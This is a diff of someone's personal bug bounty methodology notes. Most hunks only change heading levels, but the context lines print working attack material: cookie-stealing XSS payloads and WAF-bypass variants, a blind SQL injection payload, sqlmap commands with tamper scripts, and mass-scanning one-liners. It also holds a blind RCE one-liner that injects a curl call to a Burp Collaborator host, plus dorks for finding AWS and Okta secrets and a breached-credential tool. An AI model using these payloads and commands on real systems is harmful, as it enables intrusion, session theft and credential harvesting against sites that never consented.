@@ -1,6 +1,6 @@
----------------------------------
-description: For Personal Reference
----------------------------------
+---
+description: 'description: For Personal Reference'
+---
 
 # 💡 My Methodologies
 
@@ -44,15 +44,15 @@ description: For Personal Reference
 * massdns
 * paramspider
 
-### Gathering Breached Credentials
+#### Gathering Breached Credentials
 
 * [https://github.com/hmaverickadams/breach-parse](https://github.com/hmaverickadams/breach-parse)
 
-### file upload vulnerability test
+#### file upload vulnerability test
 
 * [https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)
 
-### XSS recon methodology
+#### XSS recon methodology
 
 ▶ cat domains.txt | waybackurls > urls
 
@@ -65,11 +65,11 @@ cat urls.txt        --> read the file
 -b xalgord.xss.ht   --> BXSS payload adder.
 ```
 
-### KXSS
+#### KXSS
 
 The vulnerable parameter for XSS should have Unfiltered : **\[“ ‘ < > $ | ( ) \` : ; { } ]**
 
-**Payload:**&#x20;
+**Payload:**
 
 ```
 "><img%20src=x%20onerror="alert(%27POC%20By%20Xalgord%27)"
@@ -81,7 +81,7 @@ The vulnerable parameter for XSS should have Unfiltered : **\[“ ‘ < > $ | ( 
 <%2FScriPt><sCripT+class%3DXalgord>document.write(document.cookie);<%2FsCriPt>
 ```
 
-### Open Redirect Mass Hunt
+#### Open Redirect Mass Hunt
 
 * tool = ragno, qsreplace
 
@@ -116,13 +116,13 @@ python3 ragno.py -d test.vulnweb.com -s -q -o ragno_urls.txt | cat ragno_urls.tx
 
 ```
 
-### Amass Command
+#### Amass Command
 
 ```
 amass enum -brute -o output.txt -d example.com -v
 ```
 
-### Detect Low Hanging Bugs and Sensitive Information like API Keys, Secrets etc. including JS Files and HTML Pages
+#### Detect Low Hanging Bugs and Sensitive Information like API Keys, Secrets etc. including JS Files and HTML Pages
 
 First run Amass Scan and save its output and then run Sublist3r with bruteforce mode and also save its output in different file. Now open a Website such as https://www.textfixer.com/tools/remove-duplicate-lines.php to remove duplicate subdomains.
 
@@ -150,7 +150,7 @@ Usage:
 python3 maps_api_scanner_python3.py
 ```
 
-### SQL Injection Methodologies
+#### SQL Injection Methodologies
 
 \*try login with admin admin and send login request to burp
 
@@ -170,13 +170,13 @@ sqlmap -r sql.txt --force-ssl --level 5 --risk 3 --dbs -p parameter
 
 and you have a valid SQL INJ 😎😎
 
-### Blind SQL Injection payload:
+#### Blind SQL Injection payload:
 
 ```
 email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
 ```
 
-### Reflected XSS On private program
+#### Reflected XSS On private program
 
 1-
 
@@ -198,7 +198,7 @@ cat domainhttpx.txt | nuclei -t /home/xalgord/nuclei-templates
 
 DONE 😎
 
-### Find SQL injections (command combo)
+#### Find SQL injections (command combo)
 
 ```
 subfinder -d target.com | tee -a domains
@@ -222,7 +222,7 @@ Protip: If you need to bypass WAF (Web Application Firewall) in the process, add
 --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned
 ```
 
-### Get scope of Bugcrowd programs in CLI
+#### Get scope of Bugcrowd programs in CLI
 
 There is a new tool in town called bcscope which can get you the scope of all bug bounty programs available on Bugcrowd platform, including the private ones.
 
@@ -240,7 +240,7 @@ Get the tool here:
 
 * https://github.com/sw33tLie/bcscope
 
-### Chaining file uploads with other vulns
+#### Chaining file uploads with other vulns
 
 When testing file upload functionalities in a web application, try setting the filename to the following values:
 
@@ -251,7 +251,7 @@ When testing file upload functionalities in a web application, try setting the f
 
 With these payloads, we may trigger additional vulnerabilities.
 
-### GitHub dorks for AWS, Jira, Okta .. secrets
+#### GitHub dorks for AWS, Jira, Okta .. secrets
 
 Here are some useful GitHub dorks shared by @hunter0x7 for identifying sensitive information related to Amazon AWS cloud:
 
@@ -286,7 +286,7 @@ Detailed information about GitDorker can be found [here](https://medium.com/@obh
 
 Also check related tip [BBT5-8](https://www.infosecmatter.com/bug-bounty-tips-5-aug-17/#8\_github\_dorks\_for\_finding\_secrets).
 
-### Simple reflected XSS scenario
+#### Simple reflected XSS scenario
 
 Here’s an interesting bug bounty write-up leading to a reflected XSS (Cross-Site Scripting by visiting a link).
 
@@ -311,7 +311,7 @@ This is a perfect example why we should never give up when things get difficult.
 * https://github.com/1ndianl33t/Gf-Patterns (xss pattern)
 * https://github.com/tomnomnom/hacks/tree/master/kxss
 
-### XSS firewall bypass techniques
+#### XSS firewall bypass techniques
 
 Here’s a list of 7 useful techniques on how we can bypass WAF (Web Application Firewall) while exploiting XSS (Cross-Site Scripting) in a web application:
 
@@ -353,7 +353,7 @@ Here’s a list of 7 useful techniques on how we can bypass WAF (Web Application
 
 7. Try to change request method (POST instead of GET):
 
-GET /?q=xss     POST /q=xss
+GET /?q=xss POST /q=xss
 
 8. Try capatalizing alert function:
 
@@ -361,13 +361,13 @@ GET /?q=xss     POST /q=xss
 </textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
 ```
 
-### Short XSS Payload:
+#### Short XSS Payload:
 
 ```
 <script/src=//Ǌ.₨></script>
 ```
 
-### Hex XSS Payloads:
+#### Hex XSS Payloads:
 
 ```
 </title><scRipt>alert(0x00C57D)</scRipt>
@@ -375,7 +375,7 @@ GET /?q=xss     POST /q=xss
 <iMg src%3dN onerror%3dalert(0x000D98)>
 ```
 
-### Nuclei CVE-2023-24488 Citrix XSS - Easy Bug Bounty
+#### Nuclei CVE-2023-24488 Citrix XSS - Easy Bug Bounty
 
 **Command**:\
 subfinder -d [target.com](http://target.com/) -silent | nuclei -t http/cves/2023/CVE-2023-24488.yaml\
@@ -390,7 +390,7 @@ ssl:[target.com](http://target.com/) title:"Citrix gateway"\
 **Dork**:\
 intitle:"Citrix Gateway" -site:[citrix.com](http://citrix.com/)
 
-### Some awesome people on twitter
+#### Some awesome people on twitter
 
 * [@Dark\_Knight](https://twitter.com/\_Dark\_Knight\_)
 * [@El3ctr0Byt3s](https://twitter.com/El3ctr0Byt3s)
@@ -407,19 +407,19 @@ intitle:"Citrix Gateway" -site:[citrix.com](http://citrix.com/)
 * [@Alra3ees](https://twitter.com/Alra3ees)
 * [@N008x](https://twitter.com/N008x)
 
-### Find all Subdomains in a Single Shot
+#### Find all Subdomains in a Single Shot
 
 ```
 cat domains.txt | while read url; do dom=$(assetfinder --subs-only $url|tee $url.txt;crobat -s $url|tee -a $url.txt|subfinder -d $url -silent|tee -a $url.txt |cat $url.txt|httprobe|sort -u > final-$url.txt);echo -e "\e[1;33m[-]Working with $url""\e[1;32m\n  -> done File saved. Please check :)""\n";done
 ```
 
-### Check all methods on domainlist for Information Disclosure
+#### Check all methods on domainlist for Information Disclosure
 
 ```
 cat domains.txt | httprobe | while read url;do ww=$(for i in "GET" "PUT" "HEAD" "POST" "TRACE" "CONNECT" "OPTIONS";do curl -s -L -I -X $i $url;done|grep HTTP|grep -v '301 '|awk '{ printf "%3d: %s\n", NR, $0 }');echo -e "\e[1;32m$url\e[0m""\n""$ww""\n";done
 ```
 
-### Path based xss with different type methods.
+#### Path based xss with different type methods.
 
 1. Inject payload in every path and check xss
 2. append fake paramters in every path and check xss vulnerability
@@ -429,7 +429,7 @@ cat domains.txt | httprobe | while read url;do ww=$(for i in "GET" "PUT" "HEAD" 
 cat domains.txt|gau|egrep -v '(.js|.css|.svg|.jpeg|.jpg)'|grep -v '='|while read url; do dir=$(curl -s -L "$url/xss\"><"|egrep -o '(xss"|xss\\")') dir2=$(curl -s -L "$url/?xss\"><"|egrep -o '(xss"|xss\\")') ;echo -e "Target:\e[1;33m $url\e[0m""\n" "\e[1;32m Method1 -> $dir\e[0m [POC: $url/test\"><]""\n""\e[1;32m  Method2 -> $dir2\e[0m [POC: $url/?test\"><]";done | egrep '(Target|xss)'
 ```
 
-### Find Blind RCE with automation
+#### Find Blind RCE with automation
 
 ```
 cat domains.txt|assetfinder --subs-only|httprobe|gau|grep -Ev (.js|.png|.svg|.jpeg)|grep '='|qsreplace -a ' ||curl //burp-collaborator.burpcollaborator.net'|while read url; do rce=$(curl -s $url);echo -e "[RCE-test] $url";done
@@ -437,19 +437,19 @@ cat domains.txt|assetfinder --subs-only|httprobe|gau|grep -Ev (.js|.png|.svg|.jp
 
 If you get Response of your burp collab! Boom RCE
 
-### Scan open ports of domain list using masscan
+#### Scan open ports of domain list using masscan
 
 ```
 cat domains.txt | httpx -ip -silent| awk '{print $2}' | sed -e 's/\[//g' -e 's/\]//g' | tee ips.txt | while read url; do mass=$(sudo masscan --ports 0-65535 $url);echo -e "$url \n $mass";done
 ```
 
-### Easy way to find Path based XSS
+#### Easy way to find Path based XSS
 
 ```
 cat domains.txt | gau | egrep -v '(=|.png|.svg|.jpg|.jpeg|.gif|.js|.js|.css)' | while read url; do dir=$(curl -s -L "$url/xss\"><"|grep 'xss"');echo -e "Target:\e[1;33m $url/\"><\e[0m""\n" "\e[1;32m$dir\e[0m";done
 ```
 
-### Where to look for Blind XSS
+#### Where to look for Blind XSS
 
 1. Review Forms
 2. Contact Us pages
@@ -458,13 +458,13 @@ cat domains.txt | gau | egrep -v '(=|.png|.svg|.jpg|.jpeg|.gif|.js|.js|.css)' | 
 5. First or last name field while doing credit card payments
 6. Set User-Agent to Blind XSS payload. You can do that easily from a proxy such as Burpsuite. And there are many more cases, but we would encourage you to read some reports to get a perfect knowledge, where other hackers are already applying these techniques and how you can use them in your program
 
-### Find Google map API keys in JS files & endpoints from Domains & Subdomains.
+#### Find Google map API keys in JS files & endpoints from Domains & Subdomains.
 
 ```
 cat urls.txt | assetfinder|gau|egrep -v'(.png|.svg|.gif|.jpg|.jpeg|.txt|.ico|.css|\?|.pdf)'|while read url; do map=$(curl -s $url|grep 'AIza');echo -e "$url -> $map";done
 ```
 
-### Find P1 Bug in a minute
+#### Find P1 Bug in a minute
 
 **For Checking SSTI Vulnerability..**
 
@@ -474,13 +474,13 @@ cat urls.txt |gau -subs|grep '='| egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt|
 
 Output: https://example.com/?s=ssti\{{7\*7\}} -> ssti49 --> Means Vulnerable
 
-### Check sqli Vulnerability in One shot of domains & subdomains
+#### Check sqli Vulnerability in One shot of domains & subdomains
 
 ```
 cat urls.txt | gau | egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt)' | gf sqli|urlive|tee sqli.txt && sqlmap -m sqli.txt --dbs --batch
 ```
 
-### Find xmlrpc in single shot on domain & subdomains.
+#### Find xmlrpc in single shot on domain & subdomains.
 
 ```
 cat domains.txt | assetfinder --subs-only | httprobe| while read url; do xml=$(curl -s -L $url/xmlrpc.php|grep 'XML-RPC');echo -e "$url -> $xml";done | grep 'XML-RPC' |sort -u
@@ -488,13 +488,13 @@ cat domains.txt | assetfinder --subs-only | httprobe| while read url; do xml=$(c
 
 Output: https://example.com -> XML-RPC server accepts POST requests only
 
-### JSFScan.sh usage
+#### JSFScan.sh usage
 
 ```
 bash JSFScan.sh -l targets.txt --all -r -o filname
 ```
 
-### XSS Normal test input
+#### XSS Normal test input
 
 ```
 "><u>Xalgord</u><marquee onstart='prompt(document.cookie)';>XSS</marquee>
@@ -504,11 +504,11 @@ bash JSFScan.sh -l targets.txt --all -r -o filname
 
 ![Screenshot\_2021-03-16-16-34-20-695\_com google android youtube](https://user-images.githubusercontent.com/48483027/111305580-284b7580-867d-11eb-8704-dee84bb789e9.jpg)
 
-### Increase XSS vulnerability impact
+#### Increase XSS vulnerability impact
 
 * [https://hacklido.com/blog/320-how-i-got-a-2000-bounty-with-rxss](https://hacklido.com/blog/320-how-i-got-a-2000-bounty-with-rxss)
 
-### Mindmaps for Penetration Testing
+#### Mindmaps for Penetration Testing
 
 <figure><img src="https://user-images.githubusercontent.com/48483027/111863466-c68f5200-8981-11eb-9569-38fb5eacf8c9.png" alt=""><figcaption></figcaption></figure>
 
